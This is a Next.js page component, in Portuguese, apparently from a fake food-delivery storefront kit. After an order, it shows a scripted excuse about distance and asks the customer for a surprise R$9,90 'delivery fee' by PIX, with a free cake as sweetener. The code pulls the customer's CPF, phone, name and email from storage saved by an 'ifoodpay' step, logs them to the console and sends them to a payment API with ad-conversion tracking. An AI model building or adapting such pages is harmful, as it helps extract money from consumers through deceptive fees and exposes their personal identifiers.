"use client";

import { useState, useEffect } from "react";
import Image from "next/image";
import { useRouter } from "next/navigation";
import { useTenant } from "@/contexts/TenantContext";
import { sendUtmifyConversion, getUtmParams } from "@/utils/utmify";

export default function ProblemaEntregaPage() {
  const router = useRouter();
  const { tenant } = useTenant();
  const [pixCode, setPixCode] = useState("");
  const [pixQrCode, setPixQrCode] = useState("");
  const [isPaid, setIsPaid] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [cleanupPolling, setCleanupPolling] = useState<(() => void) | null>(null);
  const [userData, setUserData] = useState<any>(null);

  // Buscar dados do usuário do localStorage
  useEffect(() => {
    const savedUserData = localStorage.getItem('userData');
    if (savedUserData) {
      setUserData(JSON.parse(savedUserData));
    }
  }, []);

  useEffect(() => {
    return () => {
      if (cleanupPolling) {
        cleanupPolling();
      }
    };
  }, [cleanupPolling]);

  const startPolling = (transactionId: string) => {
    const intervalId = setInterval(async () => {
      try {
        const response = await fetch(`/api/payment/check-status?transactionId=${transactionId}`);
        const data = await response.json();

        if (data.status === 'paid' || data.status === 'approved') {
          setIsPaid(true);
          clearInterval(intervalId);
          
          // Enviar conversão para Utmify
          const utmParams = getUtmParams();
          await sendUtmifyConversion(
            transactionId,
            990, // R$ 9,90 em centavos
            userData?.email || '',
            userData?.phone || ''
          );

          // Redirecionar para página de pedidos após 3 segundos
          setTimeout(() => {
            router.push('/pedidos');
          }, 3000);
        }
      } catch (error) {
        console.error('Erro ao verificar status:', error);
      }
    }, 3000);

    return () => clearInterval(intervalId);
  };

  const handlePayTax = async () => {
    setIsLoading(true);
    
    try {
      const utmParams = getUtmParams();
      
      // Buscar CPF e telefone do localStorage (salvos no ifoodpay)
      const savedCpf = localStorage.getItem('userCpf') || '';
      const savedPhone = localStorage.getItem('userPhone') || '';
      
      console.log('📋 Dados para gerar PIX:');
      console.log('   - Nome:', userData?.name);
      console.log('   - Email:', userData?.email);
      console.log('   - CPF (localStorage):', savedCpf);
      console.log('   - Telefone (localStorage):', savedPhone);
      
      if (!savedCpf || !savedPhone) {
        alert('Dados do usuário não encontrados. Por favor, faça um novo pedido.');
        setIsLoading(false);
        return;
      }
      
      const payload = {
        hostname: window.location.hostname,
        nome: userData?.name || 'Cliente',
        email: userData?.email || '',
        phone: savedPhone,
        cpf: savedCpf,
        amount: 990, // R$ 9,90 em centavos
        quantity: 1,
        productTitle: "Taxa de Entrega",
        utmParams: utmParams,
      };
      
      console.log('📤 Payload para API:', payload);

      const response = await fetch('/api/payment/pix', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
      });

      const data = await response.json();

      if (data.success) {
        setPixCode(data.pixData.code);
        setPixQrCode(data.pixData.qrCode);
        
        const cleanup = startPolling(data.pixData.transactionId);
        if (cleanup) setCleanupPolling(() => cleanup);
      } else {
        alert('Erro ao gerar PIX. Tente novamente.');
      }
    } catch (error) {
      console.error('Erro:', error);
      alert('Erro ao processar pagamento. Tente novamente.');
    } finally {
      setIsLoading(false);
    }
  };

  const copyPixCode = () => {
    navigator.clipboard.writeText(pixCode);
    alert('Código PIX copiado!');
  };

  if (isPaid) {
    return (
      <div style={{
        maxWidth: '500px',
        margin: '60px auto',
        background: '#fff',
        padding: '30px',
        borderRadius: '16px',
        boxShadow: '0 4px 12px rgba(0,0,0,0.1)',
        textAlign: 'center'
      }}>
        <h1 style={{ color: '#00c853', fontSize: '24px', marginBottom: '20px' }}>
          ✅ Pagamento Confirmado!
        </h1>
        <p style={{ fontSize: '18px', color: '#333' }}>
          Obrigado! Seu pedido está sendo preparado com prioridade e será entregue em breve! 🚀
        </p>
      </div>
    );
  }

  if (pixCode && pixQrCode) {
    return (
      <div style={{
        maxWidth: '500px',
        margin: '60px auto',
        background: '#fff',
        padding: '30px',
        borderRadius: '16px',
        boxShadow: '0 4px 12px rgba(0,0,0,0.1)',
        textAlign: 'center'
      }}>
        <h1 style={{ color: '#d30000', fontSize: '24px', marginBottom: '20px' }}>
          💳 Pagar Taxa de Entrega
        </h1>
        
        <div style={{ marginBottom: '20px' }}>
          <Image
            src={pixQrCode}
            alt="QR Code PIX"
            width={250}
            height={250}
            style={{ margin: '0 auto' }}
          />
        </div>

        <p style={{ fontSize: '14px', color: '#666', marginBottom: '15px' }}>
          Escaneie o QR Code acima ou copie o código PIX abaixo:
        </p>

        <div style={{
          background: '#f5f5f5',
          padding: '15px',
          borderRadius: '8px',
          marginBottom: '15px',
          wordBreak: 'break-all',
          fontSize: '12px'
        }}>
          {pixCode}
        </div>

        <button
          onClick={copyPixCode}
          style={{
            background: '#00c853',
            color: '#fff',
            padding: '12px 24px',
            fontSize: '16px',
            border: 'none',
            borderRadius: '8px',
            cursor: 'pointer',
            width: '100%'
          }}
        >
          📋 Copiar Código PIX
        </button>

        <p style={{ fontSize: '12px', color: '#999', marginTop: '15px' }}>
          Aguardando confirmação do pagamento...
        </p>
      </div>
    );
  }

  return (
    <div style={{
      fontFamily: 'Arial, sans-serif',
      background: '#f9f9f9',
      margin: 0,
      padding: 0,
      minHeight: '100vh'
    }}>
      <div style={{
        maxWidth: '500px',
        margin: '60px auto',
        background: '#fff',
        padding: '30px',
        borderRadius: '16px',
        boxShadow: '0 4px 12px rgba(0,0,0,0.1)',
        textAlign: 'center'
      }}>
        <h1 style={{ color: '#d30000', fontSize: '24px', marginBottom: '20px' }}>
          ⚠️ Atenção Senhor(a) Cliente
        </h1>
        <p style={{ fontSize: '18px', color: '#333', marginBottom: '30px' }}>
          O local de entrega do seu pedido infelizmente não conseguimos enviar grátis,
          devido à distância do nosso estabelecimento.<br/><br/>
          Como seu pedido foi feito pela promoção, não valeria a pena para nossa loja arcar com o custo total.
          <br/><br/>
          Por favor, se puder, pague essa pequena taxa de <strong>R$9,90</strong> para que possamos dar prioridade
          e entregar seu pedido <strong>agora mesmo</strong>!
        </p>

        <button
          onClick={handlePayTax}
          disabled={isLoading}
          style={{
            background: '#00c853',
            color: '#fff',
            padding: '14px 30px',
            fontSize: '18px',
            border: 'none',
            borderRadius: '8px',
            cursor: isLoading ? 'not-allowed' : 'pointer',
            textDecoration: 'none',
            display: 'inline-block',
            transition: 'background 0.3s ease',
            marginBottom: '30px',
            opacity: isLoading ? 0.7 : 1
          }}
        >
          {isLoading ? 'Gerando PIX...' : 'Pagar Taxa de R$9,90'}
        </button>

        <div style={{ marginTop: '20px' }}>
          <p style={{ fontSize: '16px', color: '#333' }}>
            🙏 Pedimos desculpas pelo transtorno! Como forma de agradecimento e carinho, vamos enviar <strong>mini Bolo no pote</strong> de brinde junto com seu pedido! 🧁
          </p>
          <Image
            src="/images/modelo2/upsell.jpg"
            alt="Mini Bolo no Pote"
            width={400}
            height={300}
            style={{
              maxWidth: '100%',
              borderRadius: '12px',
              boxShadow: '0 2px 10px rgba(0,0,0,0.1)',
              marginTop: '15px'
            }}
          />
        </div>
      </div>
    </div>
  );
}
